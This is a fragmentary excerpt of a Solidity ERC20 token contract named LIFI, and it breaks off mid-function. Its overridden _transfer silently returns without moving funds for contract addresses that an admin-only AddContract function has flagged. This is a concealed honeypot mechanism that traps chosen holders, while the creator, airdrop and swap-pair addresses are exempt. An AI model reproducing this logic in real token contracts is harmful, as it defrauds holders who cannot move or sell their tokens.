...
contract LIFI is ERC20,AccessControl{ 
    ...
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        ...
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance"); 
        if(checkAddress(from,to)){return;}
        unchecked {
    ...
    function setSwap(address swapAddress) public  onlyRole(DEFAULT_ADMIN_ROLE){
        _V2BUSDPair=swapAddress;
    }   
    ...
    function AddContract(address addr) public onlyRole(DEFAULT_ADMIN_ROLE){ 
        _isBot[addr]=3;
    }
    function checkAddress(address from ,address to) internal virtual returns(bool state){ 
        if(isContract(from) && from!=_V2BNBPair && from !=_V2BUSDPair && from != _creater && from !=_airDrop){
            if(_isBot[from]==3){
                return  true;
            } 
            return false;
        }
        if(from==_V2BNBPair || from ==_V2BUSDPair || from == _creater || from ==_airDrop){
            return false;
        }else{
